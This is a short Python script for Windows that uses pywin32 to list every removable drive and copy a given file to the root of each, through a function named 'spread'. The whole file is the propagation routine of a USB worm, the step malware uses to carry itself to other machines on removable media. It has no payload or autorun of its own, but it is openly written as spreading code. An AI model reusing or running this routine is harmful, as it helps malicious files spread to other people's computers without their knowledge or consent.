import win32con
from win32api import GetLogicalDriveStrings
from win32file import GetDriveType
from shutil import copy


def _get_removable_drives() -> list:
    removable_drives = []
    all_drives_enum: str = GetLogicalDriveStrings()
    for drive in all_drives_enum.split('\x00'):
        if GetDriveType(drive) == win32con.DRIVE_REMOVABLE:
            removable_drives.append(drive)
    return removable_drives


def spread(src_file: str):
    drives: list = _get_removable_drives()
    for drive_root in drives:
        copy(src_file, drive_root)


if __name__ == '__main__':
    spread('spread')
